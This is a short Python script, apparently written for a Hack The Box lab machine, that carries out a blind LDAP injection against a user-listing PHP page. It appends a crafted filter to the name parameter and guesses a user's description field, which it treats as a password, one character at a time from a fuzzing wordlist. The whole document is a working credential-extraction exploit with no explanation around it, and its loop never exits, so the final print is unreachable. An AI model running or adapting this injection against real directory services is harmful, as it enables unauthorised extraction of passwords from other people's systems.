import urllib.parse
import requests

def main():

    Wordlist = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt"

    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_chars}{FUZZ}*)"
    
    found_chars = ""

    while True:
        with open(Wordlist, 'r') as file:
            lines = file.readlines()
            for index, char in enumerate(map(str.strip, lines)):
                modified_url = base_url.replace("{FUZZ}", urllib.parse.quote(char)).replace("{found_chars}", found_chars, 1)
                print("Modified URL:", modified_url) #Uncomment this if u wanna the see the MOdified URL 

                response = requests.get(modified_url)

                if response.status_code == 200 and "technician" in response.text:
                    print("Found character : ", char)
                    found_chars += char
                    break  


    print("Final Password : ", found_chars)

if __name__ == "__main__":
    main()

